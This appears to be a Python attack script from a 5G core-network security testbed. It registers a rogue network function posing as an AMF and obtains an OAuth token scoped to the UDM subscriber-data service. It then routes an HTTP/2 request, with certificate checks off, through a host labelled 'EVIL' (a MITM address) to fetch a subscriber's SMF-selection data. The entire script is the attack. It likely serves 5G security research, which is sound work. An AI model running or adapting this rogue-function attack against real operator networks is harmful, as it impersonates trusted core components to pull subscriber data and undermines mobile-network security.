
import httpx
from src import *
import json

nf_instance_id = generate_variables("uuid")
token = setup_rogue(nf_instance_id, nf_type="AMF", scope="nudm-sdm")

ip   = f"http://{ip_list['EVIL']}:8000/" # mitm ip
supi = "imsi-208930000000001"
mcc  = "208"
mnc  = "93"
uri  = f"nudm-sdm/v2/{supi}/smf-select-data"
data = {"plmn-id": json.dumps({"mcc": mcc, "mnc": mnc})}

url = ip + uri

headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Authorization": f"Bearer {token}"  # Ajout de l'en-tête d'autorisation
}

with httpx.Client(http1=False,http2=True, verify=False) as client:

    if data : 
        query_string = urllib.parse.urlencode(data, doseq=True)
        url += f"?{query_string}"
    response = client.request("GET", url, headers=headers)
    print(response.content)